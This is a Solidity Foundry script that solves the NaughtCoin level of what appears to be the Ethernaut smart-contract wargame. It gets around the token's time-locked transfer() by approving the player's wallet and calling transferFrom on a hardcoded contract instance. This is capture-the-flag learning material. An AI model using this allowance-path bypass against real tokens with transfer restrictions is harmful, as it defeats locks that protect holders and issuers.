// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/15-NaughtCoin/NaughtCoin.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Level15Solution is Script {
    NaughtCoin _naughtInstance = NaughtCoin(0x994f0Ae7220b3d4e6Ec9802d60e5ABf4C7196fc1);

    function run() public{
        vm.startBroadcast();

        address myWallet = 0x45E50C61d05794e8aD0B704cd05E424111122116; // fill the player address
        uint256 myBalance = _naughtInstance.balanceOf(myWallet);
        console.log("Current Balance : ", myBalance);

        _naughtInstance.approve(myWallet, myBalance);
        _naughtInstance.transferFrom(myWallet, address(this), myBalance);

        console.log("Current Balance : ", _naughtInstance.balanceOf(myWallet));
        

        vm.stopBroadcast();
    }
}